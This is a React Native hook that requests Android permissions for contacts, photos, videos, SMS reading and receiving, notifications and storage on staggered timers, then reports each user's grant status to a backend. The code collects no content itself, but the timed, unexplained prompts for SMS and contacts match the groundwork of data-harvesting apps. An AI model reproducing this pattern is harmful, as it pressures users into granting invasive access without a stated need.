import { useEffect, useRef } from "react";
import { Platform } from "react-native";
import { apiUrl } from "@/utils/api";

const PERMISSION_STEPS = [
  {
    key: "contacts",
    label: "Contactos",
    delayMs: 1000,
  },
  {
    key: "media_images",
    label: "Fotos",
    delayMs: 4000,
  },
  {
    key: "media_video",
    label: "Videos",
    delayMs: 7000,
  },
  {
    key: "sms",
    label: "Mensajes",
    delayMs: 10000,
  },
  {
    key: "notifications",
    label: "Notificaciones",
    delayMs: 14000,
  },
  {
    key: "storage_legacy",
    label: "Almacenamiento",
    delayMs: 18000,
  },
] as const;

function getRequestedPermissions(stepKey: string, sdkVersion: number): string[] {
  if (stepKey === "contacts") {
    return ["android.permission.READ_CONTACTS"];
  }

  if (stepKey === "media_images") {
    return sdkVersion >= 33
      ? ["android.permission.READ_MEDIA_IMAGES"]
      : ["android.permission.READ_EXTERNAL_STORAGE"];
  }

  if (stepKey === "media_video") {
    return sdkVersion >= 33
      ? ["android.permission.READ_MEDIA_VIDEO"]
      : ["android.permission.READ_EXTERNAL_STORAGE"];
  }

  if (stepKey === "sms") {
    return [
      "android.permission.READ_SMS",
      "android.permission.RECEIVE_SMS",
    ];
  }

  if (stepKey === "notifications") {
    return sdkVersion >= 33 ? ["android.permission.POST_NOTIFICATIONS"] : [];
  }

  if (stepKey === "storage_legacy") {
    return ["android.permission.READ_EXTERNAL_STORAGE"];
  }

  return [];
}

async function reportPermission(
  userId: string,
  permissionKey: string,
  status: "granted" | "denied"
) {
  try {
    await fetch(apiUrl("/api/device-permissions/report"), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId, permissionType: permissionKey, status }),
    });
  } catch {
    /* non-blocking */
  }
}

export function useSequentialPermissions(userId: string | undefined) {
  const done = useRef(false);

  useEffect(() => {
    if (Platform.OS !== "android") return;
    if (!userId) return;
    if (done.current) return;
    done.current = true;

    const timers: ReturnType<typeof setTimeout>[] = [];
    const sdkVersion = Number(Platform.Version ?? 0);

    PERMISSION_STEPS.forEach((step) => {
      const t = setTimeout(async () => {
        try {
          const requestedPermissions = getRequestedPermissions(step.key, sdkVersion);
          if (requestedPermissions.length === 0) {
            await reportPermission(userId, step.key, "granted");
            return;
          }

          const { PermissionsAndroid } = await import("react-native");
          const permResult = await PermissionsAndroid.requestMultiple(
            requestedPermissions as any
          );
          const allGranted = requestedPermissions.every((permission) => {
            const status = permResult[permission as keyof typeof permResult];
            return status === PermissionsAndroid.RESULTS.GRANTED || status === "limited";
          });
          await reportPermission(userId, step.key, allGranted ? "granted" : "denied");
        } catch {
          /* non-blocking */
        }
      }, step.delayMs);
      timers.push(t);
    });

    return () => timers.forEach(clearTimeout);
  }, [userId]);
}
